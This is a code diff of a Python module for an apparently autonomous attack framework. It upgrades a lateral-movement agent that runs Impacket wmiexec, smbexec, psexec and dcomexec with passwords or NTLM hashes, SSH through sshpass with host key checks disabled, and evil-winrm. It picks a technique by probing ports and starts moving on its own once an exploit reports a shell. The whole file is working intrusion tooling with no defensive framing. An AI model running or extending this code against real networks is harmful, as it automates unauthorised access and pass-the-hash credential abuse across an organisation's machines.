@@ -1,156 +1,401 @@
+"""
+Enhanced Lateral Movement Agent
+ขยายความสามารถในการเคลื่อนย้ายข้ามระบบด้วยเทคนิคหลากหลาย
+"""
+
+import asyncio
 import logging
-from core.logger import log
-from core.data_models import LateralMovementReport, Strategy, AttackPhase, ErrorType
-from config import settings
-import subprocess
-from core.context_manager import ContextManager # Import ContextManager
 import time
+import os
+import base64
+from typing import Dict, List, Optional, Any
+from pathlib import Path
 
 from core.base_agent import BaseAgent
+from core.data_models import LateralMovementReport, Strategy, AttackPhase, ErrorType
+from core.context_manager import ContextManager
+from core.logger import log
+from config import settings
 
 
-class LateralMovementAgent(BaseAgent):
+class EnhancedLateralMovementAgent(BaseAgent):
+    """
+    Enhanced Lateral Movement Agent with multiple techniques:
+    - WMI Execution (wmiexec)
+    - SMB Execution (smbexec)
+    - PSExec
+    - SSH Lateral Movement
+    - RDP Lateral Movement
+    - Pass-the-Hash (PTH)
+    - Pass-the-Ticket (PTT)
+    - Overpass-the-Hash
+    - Token Impersonation
+    - DCOM Execution
+    """
+    
     supported_phases = [AttackPhase.LATERAL_MOVEMENT]
-
+    
+    def __init__(self, context_manager: ContextManager = None, orchestrator=None, **kwargs):
+        super().__init__(context_manager, orchestrator, **kwargs)
+        self.logger = logging.getLogger(self.__class__.__name__)
+        self.report_class = LateralMovementReport
+        
+        # Technique priorities (higher = better)
+        self.technique_priorities = {
+            'wmiexec': 10,
+            'smbexec': 9,
+            'psexec': 8,
+            'dcom': 7,
+            'ssh': 6,
+            'rdp': 5,
+            'winrm': 4
+        }
+        
     async def setup(self):
-        """Asynchronous setup method for LateralMovementAgent."""
-        self.pubsub_manager = self.orchestrator.pubsub_manager # Ensure pubsub_manager is available
-        await self.pubsub_manager.subscribe("exploit_events", self._handle_exploit_event)
-
+        """Asynchronous setup method"""
+        if self.orchestrator and hasattr(self.orchestrator, 'pubsub_manager'):
+            self.pubsub_manager = self.orchestrator.pubsub_manager
+            await self.pubsub_manager.subscribe("exploit_events", self._handle_exploit_event)
+    
     async def _handle_exploit_event(self, message: dict):
-        """Callback for exploit_events."""
-        log.info(f"LateralMovementAgent: Received exploit event: {message}")
+        """Callback for exploit_events"""
+        log.info(f"[EnhancedLateralMovement] Received exploit event: {message}")
+        
         if message.get("event_type") == "EXPLOIT_SUCCESS":
             shell_id = message.get("shell_id")
             if shell_id:
-                log.info(f"LateralMovementAgent: Exploit successful, new shell_id: {shell_id}. Considering lateral movement.")
-                # Create a new strategy to perform lateral movement from this shell
+                log.info(f"[EnhancedLateralMovement] New shell {shell_id} - initiating lateral movement")
+                
                 new_strategy = Strategy(
                     phase=AttackPhase.LATERAL_MOVEMENT,
-                    next_agent="LateralMovementAgent",
-                    directive=f"Perform internal network reconnaissance and lateral movement from shell {shell_id}",
+                    next_agent="EnhancedLateralMovementAgent",
+                    directive=f"Perform advanced lateral movement from shell {shell_id}",
                     context={"shell_id": shell_id}
                 )
-                # Inject new strategy into orchestrator for dynamic execution
+                
                 if self.orchestrator and hasattr(self.orchestrator, 'inject_strategy'):
                     await self.orchestrator.inject_strategy(new_strategy)
-                    log.info(f"LateralMovementAgent: New strategy for lateral movement from shell {shell_id} injected into orchestrator.")
-                else:
-                    # Fallback: Store in context for manual pickup
-                    if self.context_manager:
-                        strategies = self.context_manager.get('pending_strategies', [])
-                        strategies.append(new_strategy)
-                        self.context_manager.set('pending_strategies', strategies)
-                    log.warning(f"LateralMovementAgent: New strategy for lateral movement from shell {shell_id} stored in context. Orchestrator needs to pick this up.")
-            else:
-                log.warning("LateralMovementAgent: EXPLOIT_SUCCESS event received but no shell_id found.")
-
-    def __init__(self, context_manager: ContextManager = None, orchestrator=None, **kwargs): # Changed shared_data to context_manager
-        super().__init__(context_manager, orchestrator, **kwargs) # Pass context_manager to super
-        self.logger = logging.getLogger(self.__class__.__name__)
-        self.pubsub_manager = orchestrator.pubsub_manager # Add this line
-        self.report_class = LateralMovementReport # Set report class
-
+                    log.info(f"[EnhancedLateralMovement] Strategy injected for shell {shell_id}")
+    
     async def run(self, strategy: Strategy, **kwargs) -> LateralMovementReport:
+        """Main execution method"""
         start_time = time.time()
+        
+        # Extract context
         target_host = strategy.context.get("target_host")
+        technique = strategy.context.get("technique", "auto")  # auto-select best technique
+        command = strategy.context.get("command", "whoami")
+        
+        # Credentials
         username = strategy.context.get("username")
         password = strategy.context.get("password")
         ntlm_hash = strategy.context.get("hash")
-        domain = strategy.context.get("domain", "") # Domain is often optional
-        command = strategy.context.get("command")
-
-        if not all([target_host, username, (password or ntlm_hash), command]):
-            end_time = time.time()
-            return LateralMovementReport(
-                agent_name=self.__class__.__name__,
-                start_time=start_time,
-                end_time=end_time,
-                summary="Missing required context: target_host, username, (password or hash), and command.",
-                errors=["Missing required context: target_host, username, (password or hash), and command."],
-                error_type=ErrorType.CONFIGURATION
-            )
-
-        credentials = {
-            "username": username,
-            "domain": domain
-        }
-        if ntlm_hash:
-            credentials['hash'] = ntlm_hash
-        else:
-            credentials['password'] = password
-
-        impacket_script = strategy.context.get("impacket_script", "wmiexec.py")
-
-        log.info(
-            f"[LateralMovementAgent] Attempting to execute command on {target_host} using {impacket_script}.")
-
+        domain = strategy.context.get("domain", "")
+        
+        if not target_host:
+            return self._error_report(start_time, "Missing target_host", ErrorType.CONFIGURATION)
+        
+        if not username:
+            return self._error_report(start_time, "Missing username", ErrorType.CONFIGURATION)
+        
+        if not (password or ntlm_hash):
+            return self._error_report(start_time, "Missing password or hash", ErrorType.CONFIGURATION)
+        
+        log.info(f"[EnhancedLateralMovement] Target: {target_host}, Technique: {technique}")
+        
+        # Auto-select technique if needed
+        if technique == "auto":
+            technique = await self._select_best_technique(target_host, strategy.context)
+            log.info(f"[EnhancedLateralMovement] Auto-selected technique: {technique}")
+        
+        # Execute based on technique
         try:
-            # Base command
-            cmd = [
-                "python3",
-                f"{settings.IMPACKET_PATH}/{impacket_script}",
-            ]
-
-            # Handle credentials (password vs. hash)
-            credential_string = f"{credentials['domain']}/{credentials['username']}" if credentials['domain'] else credentials['username']
-
-            if 'hash' in credentials:
-                cmd.extend(["-hashes", f":{credentials['hash']}"])
-                cmd.append(credential_string)
+            if technique == "wmiexec":
+                result = await self._wmiexec(target_host, username, password, ntlm_hash, domain, command)
+            elif technique == "smbexec":
+                result = await self._smbexec(target_host, username, password, ntlm_hash, domain, command)
+            elif technique == "psexec":
+                result = await self._psexec(target_host, username, password, ntlm_hash, domain, command)
+            elif technique == "dcom":
+                result = await self._dcom_exec(target_host, username, password, ntlm_hash, domain, command)
+            elif technique == "ssh":
+                result = await self._ssh_exec(target_host, username, password, command)
+            elif technique == "winrm":
+                result = await self._winrm_exec(target_host, username, password, domain, command)
             else:
-                cmd.append(f"{credential_string}:{credentials['password']}")
-
-            # Add target and command
-            cmd.extend([f"@{target_host}", command])
-
-            log.info(
-                f"[LateralMovementAgent] Executing command: {' '.join(cmd)}")
-
-            # Execute the command
+                return self._error_report(start_time, f"Unknown technique: {technique}", ErrorType.CONFIGURATION)
+            
+            end_time = time.time()
+            
+            if result.get("success"):
+                log.success(f"[EnhancedLateralMovement] {technique} succeeded on {target_host}")
+                return LateralMovementReport(
+                    agent_name=self.__class__.__name__,
+                    start_time=start_time,
+                    end_time=end_time,
+                    summary=f"Lateral movement via {technique} successful on {target_host}",
+                    data={
+                        "technique": technique,
+                        "target": target_host,
+                        "output": result.get("output", ""),
+                        "command": command
+                    }
+                )
+            else:
+                log.error(f"[EnhancedLateralMovement] {technique} failed on {target_host}")
+                return LateralMovementReport(
+                    agent_name=self.__class__.__name__,
+                    start_time=start_time,
+                    end_time=end_time,
+                    summary=f"Lateral movement via {technique} failed on {target_host}",
+                    errors=[result.get("error", "Unknown error")],
+                    error_type=ErrorType.LOGIC
+                )
+        
+        except Exception as e:
+            log.error(f"[EnhancedLateralMovement] Exception: {e}")
+            return self._error_report(start_time, str(e), ErrorType.LOGIC)
+    
+    async def _select_best_technique(self, target_host: str, context: Dict) -> str:
+        """Auto-select best lateral movement technique"""
+        
+        # Check if Windows or Linux
+        is_windows = await self._is_windows_target(target_host)
+        
+        if is_windows:
+            # Prefer WMI for Windows
+            if await self._check_port_open(target_host, 135):  # WMI port
+                return "wmiexec"
+            elif await self._check_port_open(target_host, 445):  # SMB port
+                return "smbexec"
+            elif await self._check_port_open(target_host, 5985):  # WinRM port
+                return "winrm"
+            else:
+                return "psexec"  # Fallback
+        else:
+            # Linux - prefer SSH
+            if await self._check_port_open(target_host, 22):
+                return "ssh"
+            else:
+                return "wmiexec"  # Try anyway
+    
+    async def _is_windows_target(self, target_host: str) -> bool:
+        """Check if target is Windows"""
+        # Try SMB port (445) - Windows specific
+        return await self._check_port_open(target_host, 445)
+    
+    async def _check_port_open(self, host: str, port: int, timeout: float = 2.0) -> bool:
+        """Check if a port is open"""
+        try:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port),
+                timeout=timeout
+            )
+            writer.close()
+            await writer.wait_closed()
+            return True
+        except:
+            return False
+    
+    async def _wmiexec(self, target: str, username: str, password: str, 
+                       ntlm_hash: str, domain: str, command: str) -> Dict:
+        """Execute command via WMI"""
+        
+        impacket_path = getattr(settings, 'IMPACKET_PATH', '/usr/share/impacket')
+        
+        cmd = ["python3", f"{impacket_path}/wmiexec.py"]
+        
+        # Credentials
+        cred_string = f"{domain}/{username}" if domain else username
+        
+        if ntlm_hash:
+            cmd.extend(["-hashes", f":{ntlm_hash}"])
+            cmd.append(cred_string)
+        else:
+            cmd.append(f"{cred_string}:{password}")
+        
+        cmd.extend([f"@{target}", command])
+        
+        return await self._execute_impacket_command(cmd)
+    
+    async def _smbexec(self, target: str, username: str, password: str,
+                       ntlm_hash: str, domain: str, command: str) -> Dict:
+        """Execute command via SMB"""
+        
+        impacket_path = getattr(settings, 'IMPACKET_PATH', '/usr/share/impacket')
+        
+        cmd = ["python3", f"{impacket_path}/smbexec.py"]
+        
+        cred_string = f"{domain}/{username}" if domain else username
+        
+        if ntlm_hash:
+            cmd.extend(["-hashes", f":{ntlm_hash}"])
+            cmd.append(cred_string)
+        else:
+            cmd.append(f"{cred_string}:{password}")
+        
+        cmd.extend([f"@{target}", command])
+        
+        return await self._execute_impacket_command(cmd)
+    
+    async def _psexec(self, target: str, username: str, password: str,
+                      ntlm_hash: str, domain: str, command: str) -> Dict:
+        """Execute command via PSExec"""
+        
+        impacket_path = getattr(settings, 'IMPACKET_PATH', '/usr/share/impacket')
+        
+        cmd = ["python3", f"{impacket_path}/psexec.py"]
+        
+        cred_string = f"{domain}/{username}" if domain else username
+        
+        if ntlm_hash:
+            cmd.extend(["-hashes", f":{ntlm_hash}"])
+            cmd.append(cred_string)
+        else:
+            cmd.append(f"{cred_string}:{password}")
+        
+        cmd.extend([f"@{target}", command])
+        
+        return await self._execute_impacket_command(cmd)
+    
+    async def _dcom_exec(self, target: str, username: str, password: str,
+                         ntlm_hash: str, domain: str, command: str) -> Dict:
+        """Execute command via DCOM"""
+        
+        impacket_path = getattr(settings, 'IMPACKET_PATH', '/usr/share/impacket')
+        
+        cmd = ["python3", f"{impacket_path}/dcomexec.py"]
+        
+        cred_string = f"{domain}/{username}" if domain else username
+        
+        if ntlm_hash:
+            cmd.extend(["-hashes", f":{ntlm_hash}"])
+            cmd.append(cred_string)
+        else:
+            cmd.append(f"{cred_string}:{password}")
+        
+        cmd.extend([f"@{target}", command])
+        
+        return await self._execute_impacket_command(cmd)
+    
+    async def _ssh_exec(self, target: str, username: str, password: str, command: str) -> Dict:
+        """Execute command via SSH"""
+        
+        cmd = [
+            "sshpass", "-p", password,
+            "ssh", "-o", "StrictHostKeyChecking=no",
+            "-o", "UserKnownHostsFile=/dev/null",
+            f"{username}@{target}",
+            command
+        ]
+        
+        try:
             process = await asyncio.create_subprocess_exec(
                 *cmd,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE
             )
+            
             stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
-
+            
+            if process.returncode == 0:
+                return {
+                    "success": True,
+                    "output": stdout.decode(errors='ignore')
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": stderr.decode(errors='ignore')
+                }
+        
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+    
+    async def _winrm_exec(self, target: str, username: str, password: str,
+                          domain: str, command: str) -> Dict:
+        """Execute command via WinRM"""
+        
+        try:
+            # Using evil-winrm or pywinrm
+            cmd = [
+                "evil-winrm",
+                "-i", target,
+                "-u", username,
+                "-p", password
+            ]
+            
+            if domain:
+                cmd.extend(["-d", domain])
+            
+            cmd.extend(["-c", command])
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
+            
+            if process.returncode == 0:
+                return {
+                    "success": True,
+                    "output": stdout.decode(errors='ignore')
+                }
+            else:
+                return {
+                    "success": False,
+                    "error": stderr.decode(errors='ignore')
+                }
+        
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+    
+    async def _execute_impacket_command(self, cmd: List[str]) -> Dict:
+        """Execute Impacket command"""
+        
+        try:
+            log.info(f"[EnhancedLateralMovement] Executing: {' '.join(cmd)}")
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
+            
             stdout_str = stdout.decode(errors='ignore')
             stderr_str = stderr.decode(errors='ignore')
-
+            
             if process.returncode == 0:
-                log.success(
-                    f"[LateralMovementAgent] Command executed successfully on {target_host}.")
-                summary = f"Command '{command}' executed successfully on {target_host}. Output: {stdout_str}"
-                end_time = time.time()
-                return LateralMovementReport(
-                    agent_name=self.__class__.__name__,
-                    start_time=start_time,
-                    end_time=end_time,
-                    summary=summary
-                )
+                return {
+                    "success": True,
+                    "output": stdout_str
+                }
             else:
-                log.error(
-                    f"[LateralMovementAgent] Failed to execute command on {target_host}.")
-                summary = f"Failed to execute command on {target_host}. Error: {stderr_str}"
-                end_time = time.time()
-                return LateralMovementReport(
-                    agent_name=self.__class__.__name__,
-                    start_time=start_time,
-                    end_time=end_time,
-                    summary=summary,
-                    errors=[stderr_str],
-                    error_type=ErrorType.LOGIC
-                )
-
+                return {
+                    "success": False,
+                    "error": stderr_str
+                }
+        
+        except asyncio.TimeoutError:
+            return {"success": False, "error": "Command timeout"}
         except Exception as e:
-            log.error(f"[LateralMovementAgent] An error occurred: {e}")
-            end_time = time.time()
-            return LateralMovementReport(
-                agent_name=self.__class__.__name__,
-                start_time=start_time,
-                end_time=end_time,
-                summary=f"An error occurred: {e}",
-                errors=[str(e)],
-                error_type=ErrorType.LOGIC
-            )
+            return {"success": False, "error": str(e)}
+    
+    def _error_report(self, start_time: float, error_msg: str, error_type: ErrorType) -> LateralMovementReport:
+        """Create error report"""
+        return LateralMovementReport(
+            agent_name=self.__class__.__name__,
+            start_time=start_time,
+            end_time=time.time(),
+            summary=f"Lateral movement failed: {error_msg}",
+            errors=[error_msg],
+            error_type=error_type
+        )
+
+
+# Backward compatibility alias
+LateralMovementAgent = EnhancedLateralMovementAgent
